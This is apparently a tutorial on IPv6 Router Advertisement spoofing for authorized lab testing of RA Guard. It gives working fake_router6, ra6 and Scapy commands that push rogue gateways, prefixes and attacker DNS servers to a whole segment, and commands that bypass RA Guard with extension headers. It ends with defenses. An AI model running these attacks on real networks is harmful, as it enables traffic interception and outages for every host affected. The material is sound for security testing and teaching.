# How to Perform Router Advertisement Spoofing in Lab Environments

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, Router Advertisement, Spoofing, Security Testing, Lab, SLAAC

Description: A guide to performing Router Advertisement spoofing attacks in authorized lab environments to test RA Guard effectiveness and IPv6 SLAAC security.

Router Advertisement (RA) spoofing is one of the most impactful IPv6 attacks on local network segments. A rogue RA can give every host on a segment a new default gateway, new DNS servers, and a new IPv6 prefix - all controlled by the attacker. This guide demonstrates the attack for authorized security testing.

**Warning**: Only perform in isolated lab environments with explicit authorization.

## What RA Spoofing Achieves

A malicious RA sent to `ff02::1` (all-nodes multicast) can:
1. Override the legitimate default gateway
2. Announce a new IPv6 prefix (causing SLAAC misconfiguration)
3. Announce attacker-controlled DNS servers (via RDNSS option)
4. Set router lifetime to 0 (remove the legitimate default route)

## Method 1: fake_router6 (THC-IPv6)

```bash
# Announce attacker as default router with new prefix

sudo fake_router6 eth0 2001:db8:attacker::/64

# Announce with high router preference (overrides existing routers)
sudo fake_router6 -H eth0 2001:db8:attacker::/64

# Set router lifetime to 0 (remove all default routes from victims)
sudo fake_router6 eth0 ::/0 0
```

## Method 2: ra6 (SI6 Networks Toolkit)

```bash
# Send RA with attacker-controlled prefix
sudo ra6 -i eth0 \
  -P 2001:db8:attacker::/64 \
  --router-lifetime 3600 \
  --rdnss 2001:db8::evil-dns

# Send to all-nodes multicast
sudo ra6 -i eth0 -d ff02::1 -P 2001:db8:attacker::/64

# Continuous RA to maintain control
sudo ra6 -i eth0 -d ff02::1 \
  -P 2001:db8:attacker::/64 \
  --rdnss 2001:db8::evil-dns \
  --loop --sleep 30
```

## Method 3: Scapy RA Construction

```python
from scapy.all import *
from scapy.layers.inet6 import *

iface = "eth0"
attacker_mac = get_if_hwaddr(iface)

ra = Ether(src=attacker_mac, dst="33:33:00:00:00:01") / \
     IPv6(
         src="fe80::attacker",
         dst="ff02::1",
         hlim=255
     ) / \
     ICMPv6ND_RA(
         chlim=64,
         M=0, O=0,          # SLAAC mode (no DHCPv6)
         routerlifetime=3600,
         prf=1               # High preference
     ) / \
     ICMPv6NDOptPrefixInfo(
         prefixlen=64,
         L=1, A=1,
         validlifetime=86400,
         preferredlifetime=14400,
         prefix="2001:db8:attacker::"
     ) / \
     ICMPv6NDOptRDNSS(
         lifetime=3600,
         dns=["2001:db8::evil-dns"]
     )

# Send continuously
sendp(ra, iface=iface, loop=1, inter=30)
```

## Verifying RA Spoofing Impact

```bash
# On victim host: check if rogue route appeared
ip -6 route show default

# Check if victim configured SLAAC address from attacker's prefix
ip -6 addr show | grep 2001:db8:attacker

# Check if DNS changed to attacker's server
cat /etc/resolv.conf
# or
resolvectl status | grep "DNS Servers"
```

## Testing RA Guard Bypass

Some RA Guard implementations can be bypassed with extension headers:

```bash
# RA with fragmentation header (bypass naive RA Guard)
sudo ra6 -i eth0 --frag-hdr -P 2001:db8:attacker::/64 -d ff02::1

# RA with hop-by-hop header (bypass type-based RA Guard)
sudo ra6 -i eth0 --hbh-opt -P 2001:db8:attacker::/64 -d ff02::1
```

## Validating RA Guard Configuration

After testing, verify RA Guard blocks the rogue RAs:

```bash
# Monitor for RA acceptance on victim
watch -n 2 'ip -6 route show default'

# Monitor NDP traffic
sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 134'
```

## Defenses

```bash
# Block unsolicited RAs with ip6tables (host-based)
sudo ip6tables -A INPUT \
  -p icmpv6 --icmpv6-type router-advertisement \
  -m hl ! --hl-eq 255 \
  -j DROP

# The legitimate RA from your router will have hop-limit 255
# Spoofed RAs from off-link sources will have lower hop-limit
```

| Defense | Notes |
|---|---|
| RA Guard (RFC 6105) | Configure on all managed switch ports |
| SEND | Cryptographic RA signing |
| ip6tables | Host-level RA filtering |
| NDPMon | Alerts on new routers |
| radvd monitoring | Detect competing RA sources |

RA spoofing testing reveals whether your network's switch-level RA Guard is actually enabled and effective - a critical control for any IPv6 network.
